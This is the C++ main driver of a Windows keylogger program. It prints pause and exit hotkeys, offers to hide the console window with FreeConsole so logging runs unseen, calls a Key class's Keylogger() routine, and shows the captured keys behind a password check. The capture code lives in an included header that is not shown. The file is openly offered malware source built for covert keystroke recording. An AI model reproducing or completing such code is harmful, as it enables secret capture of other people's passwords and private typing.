#include <iostream>
#include <Windows.h>
#include <string>
#include "Key.h"
#include "Password.h"

using namespace std;

int main()
{
	cout << "---------------IMPORTANT!---------------" << endl;
	cout << "Press [F10] to pause keylogger." << endl;
	cout << "Press [F10] again to resume keylogger." << endl;
	cout << "Press [F12] to exit keylogger." << endl;
	cout << "Press [ESC] to terminate program." << endl;
	cout << "----------------------------------------" << endl;
	cout << "Please press [ENTER] to continue..." << endl;
	cin.get();
	
	string input;
	
	cout << "Hide command prompt?" << endl;
	do
	{
		cout << "Please only enter 'y' or 'n'!" << endl;
		cin >> input; //get input

		//turn uppercase into lowercase
		if (input[0] < 91)
			input[0] += 32;

	} while (input != "y" && input != "n");
	
	bool hide = false;

	if (input == "y")
	{
		FreeConsole(); //user chooses to hide cmd prompt
		hide = true;
	}

	Key execute;

	execute.setLetters();
	execute.Keylogger(); //run the keylogger
	execute.Sort();
	cout << "Word created: " << execute.Word() << endl;

	if (hide == true)
		AllocConsole(); //show cmd prompt after done

	cout << "Ended.\n\nShow keys logged?" << endl; 
	do
	{
		cout << "Please only enter 'y' or 'n'!" << endl;
		cin >> input;

		cout << endl;

		//turn uppercase into lowercase
		if (input[0] < 91)
			input[0] += 32;

	} while (input != "y" && input != "n");
	
	if (input[0] == 'y')
	{
		Password check;

		//verify password to show keys once granted access
		if (check.Access() == true)
		{
			cout << "\nResults:" << endl;
			execute.showKeys();
			cout << endl;
		}
	}

	cout << "Please press [ENTER] to exit." << endl;
	cin.get();

	return 0;
}